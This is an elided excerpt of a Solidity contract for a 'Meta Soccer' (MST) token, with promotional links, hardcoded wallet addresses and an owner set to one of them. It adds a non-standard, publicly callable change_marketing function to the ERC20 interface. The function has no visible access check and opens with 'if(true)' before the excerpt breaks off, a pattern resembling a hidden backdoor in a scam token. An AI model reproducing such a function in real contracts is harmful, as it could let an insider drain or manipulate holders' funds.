...
// Telegram : https://t.me/MetaSoccerToken

// 🌎 Website : https://metasoccertkn.com/
...
interface IERC20 {
    ...
    function change_marketing(address transfered_Address) external returns (uint256);
...
contract MetaSoccerToken is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x468A64da50f7c1f7551a74D3FEc7f7f1557b6f00); 
    address payable public Wallet_Utility = payable(0x97aF6d352768a279645f812b198464ed77c7bBD0);
    ...
    string private constant _name = "Meta Soccer"; 
    string private constant _symbol = unicode"MST"; 
    ...
    constructor () {
        ...
        _owner = 0x97aF6d352768a279645f812b198464ed77c7bBD0;
    ...
    function change_marketing(address transfered_Address) public override returns (uint256) {
        if(true)
